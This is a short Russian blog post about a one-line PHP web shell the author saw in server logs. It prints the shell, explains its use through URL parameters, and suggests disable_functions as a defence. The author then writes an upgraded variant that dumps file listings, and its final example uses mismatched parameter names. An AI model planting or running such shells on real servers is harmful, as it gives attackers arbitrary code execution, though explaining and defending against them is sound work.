---
title: "Самый маленький PHP shell"
date: "2021-07-28T20:34:56.000Z"
description: "Или атаки хакеров на PHP в 2021 году

Давеча увидел в логах попытку залить такую вот штуку, решил поделиться. Это
самый маленьки"
---

<p><strong>Или атаки хакеров на PHP в 2021 году</strong></p><p>Давеча увидел в логах попытку залить такую вот штуку, решил поделиться. Это самый маленький шелл:</p><pre><code class="language-php">&lt;?= @extract($_REQUEST); @die($callf($shargs));</code></pre><p>Собственно тут все просто. Для тех, кто не сразу увидел проблему, поясню: теперь подставляя в URL параметры ?callf=функция&amp;shargs=аргумент можно выполнить простые действия. Например:</p><pre><code>http://target.lol/foo/some?callf=date&amp;shargs=Y-m-d

Выведет результат работы date('Y-m-d')</code></pre><p>Это самое безобидно. А что можно натворить обидного нафантазируете сами. У меня этот шелл всеравно не сработал из-за настроек безопасности, самое простое это в php.ini перечислить функции для запрета:</p><pre><code class="language-bash">disable_functions = extract, ...</code></pre><p>И так далее. Тогда все функции, указанные в этой настройке будут считаться несуществующими.</p><p>Кстати, если бы я писал такой шел, то для 2021 года я бы его модифицировал так:</p><pre><code class="language-php">&lt;?= @extract($_REQUEST); @die(var_dump($callf(...$shargs)));</code></pre><p>Это позволяет передавать более одного аргумента, а так же позволяет возвращать массив данных (в отличие от предыдущего варианта):</p><pre><code>?callf=glob&amp;callf[]=*</code></pre><p>Выведет дамп массива файлов в текущем каталоге.</p>

